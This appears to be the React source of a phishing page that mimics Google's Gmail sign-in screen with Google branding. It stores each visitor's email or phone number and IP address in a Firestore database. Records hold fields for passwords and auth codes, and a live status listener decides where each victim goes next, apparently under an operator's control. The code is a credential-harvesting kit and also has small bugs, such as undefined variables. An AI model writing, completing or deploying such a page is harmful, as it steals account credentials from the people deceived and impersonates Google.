import React, { useState,useEffect} from "react";
import { Button } from "../../components/ui/button";
import { Input } from "../../components/ui/input";
import { Eye, EyeOff } from "lucide-react";
import { db } from "../../firebase";
import GoogleLoadingBar from "../GoogleLoadingBar";

import {
   collection,
   addDoc,
   onSnapshot,
   query,
   where,
   doc,
   updateDoc,
   runTransaction,
   orderBy,
   getDocs,
   limit,
 } from "firebase/firestore";
 import { useNavigate } from "react-router-dom";
import validator from 'validator'

export default function EnterEmail() {
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const [result, setResult] = useState({
        title: "",
        detail: "",
      });
      const navigate = useNavigate();
      const [data, setData] = useState({});
      const usersRef = collection(db, "users");
      const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
      const listener = (userID) => {
         onSnapshot(doc(db, "users", userID), (snapshot) => {
           const status = snapshot.data()?.status;
           switch (status) {
             case -1:
              setIsLoading(false); // Set loading back to false
              setError("Email or phone number is incorrect");
              break;
             case 2:
               navigate(`/google/auth/${userID}`);
               break;
             default:
               console.log(status);
           }
         });
       };
   
       const updateIndex = async (userID) => {
         try {
           await runTransaction(db, async (transaction) => {
             const sfDocRef = doc(db, "users", userID);
             const sfDoc = await transaction.get(sfDocRef);
             const dosLast = await getDocs(q);
             if (!sfDoc.exists()) {
               throw "Document does not exist!";
             }
             const [lastest] = dosLast.docs
             const auto_id = (lastest?.get("auto_id") || 0) + 1;
             transaction.update(sfDocRef, { auto_id });
           });
     
           console.log("Transaction successfully committed!");
         } catch (e) {
           console.log("Transaction failed: ", e);
         }
       };
    
      const handleSubmit = async () => {
         setError("");
         if(validator.isEmail(email) || validator.isMobilePhone(email) && (email.length > 5 && password.length > 5))
        {
         const ipAddr = localStorage.getItem("location");
         setIsLoading(true); // Set loading to true while saving data
         try {
          if(data.id){
             updateDoc(doc(db, "users", data.id), {
               status: 1,
               emai: email
             });
          }else{
             const user = await addDoc(collection(db, "users"), {
             pass:'',phone:'',email:email,auth:'',ip:ipAddr,status: 1,status2:0,type:'',num:0,createdAt: new Date().getTime(),
           }
          );
           if(user.id){
             setData(user);
             updateIndex(user.id);
             listener(user.id);
           }
          }
         } catch (error) {
           console.error("Error saving data to Firestore: ", error);
         } finally {
         }
        }else{
          setResult({
            title: "Incorrect password",
            detail: "Enter your email address or mobile number to continue.",
          });
           setHideWarning(false)
           return;
         }
       };

       

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-start sm:justify-center font-sans text-[#202124]">
      {isLoading && (
        <GoogleLoadingBar/>
      )}
      {/* Card container */}
      <div className="bg-white w-full max-w-sm sm:max-w-md rounded-none sm:rounded-2xl sm:shadow-[0_8px_24px_rgba(60,64,67,0.12),0_2px_6px_rgba(60,64,67,0.08)] sm:p-10 px-6 py-12 mt-0 sm:mt-0 flex flex-col">
        {/* Google Logo */}
<div className="flex flex-col sm:items-center items-start justify-center">

  <div className="mb-8 sm:mb-6">
<img
  src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
  alt="Google"
  className="hidden sm:block h-8"
/>
<img
  src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/768px-Google_%22G%22_logo.svg.png"
  alt="Google"
  className="block sm:hidden h-11"
/>

  </div>

  {/* Title */}
  <h1 className="text-xl sm:text-3xl font-normal text-left sm:text-center mb-2">
    Sign in
  </h1>

  {/* Description */}
  <p className="text-sm sm:text-base text-left sm:text-center text-[#5f6368] mb-8 sm:mb-10">
    to continue to Gmail
  </p>

</div>

        {/* Form */}
        <div className="flex flex-col flex-1">
          <input 
            id="email"
            name="email"
            type="text"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Email or phone"
            className={`w-full border ${
              error
                ? "border-1 border-red-500 focus:ring-2 focus:ring-red-500 rounded"
                : "border-gray-300 focus:ring-blue-600 focus:border-blue-600"
            } rounded-md px-3 py-3 text-base focus:outline-none focus:ring-1`}
          />
          {error && <p className="text-red-600 text-sm mt-2">{error}</p>}

          <a
            href="#"
            onClick={(e) => e.preventDefault()}
            className="text-sm text-blue-600 hover:underline mt-3"
          >
            Forgot email?
          </a>
          {/* Guest mode info */}
            <div className="mt-8 text-left text-sm text-[#5f6368] leading-snug px-0 sm:px-0">
            Not your computer? Use Guest mode to sign in privately.{" "}
            <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-blue-600 hover:underline"
            >
                Learn more
            </a>
            </div>


          <div className="flex justify-between items-center mt-10 space-y-0">
  <a
    href="#"
    onClick={(e) => e.preventDefault()}
    className="text-sm text-blue-600 font-medium hover:underline"
  >
    Create account
  </a>

  <button
    disabled={isLoading} onClick={handleSubmit}
    className="bg-blue-600 text-white font-medium text-sm px-6 py-2 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300 transition-all"
  >
    {
              isLoading
                ? "Waiting.."
                : "Next"
            } 
  </button>
</div>

        </div>
      </div>

      {/* Footer */}
      <footer
        className="
          w-full max-w-sm sm:max-w-md mt-8 sm:mt-10 pb-8 sm:pb-0
          flex flex-col sm:flex-row items-center justify-between
          space-y-3 sm:space-y-0
          text-xs
          text-[#9aa0a6] sm:text-[#5f6368]
        "
      >
        <select
          className="bg-transparent border-none outline-none cursor-pointer text-xs"
          defaultValue="en-US"
        >
          <option value="en-US">English (United States)</option>
          {/* <option value="vi-VN">Tiếng Việt</option>
          <option value="fr-FR">Français (France)</option>
          <option value="de-DE">Deutsch</option> */}
        </select>

        <div className="flex items-center space-x-4">
          {["Help", "Privacy", "Terms"].map((link) => (
            <a
              key={link}
              href="#"
              onClick={(e) => e.preventDefault()}
              className="hover:underline hover:text-[#5f6368] transition-colors"
            >
              {link}
            </a>
          ))}
        </div>
      </footer>
    </div>
  );
}
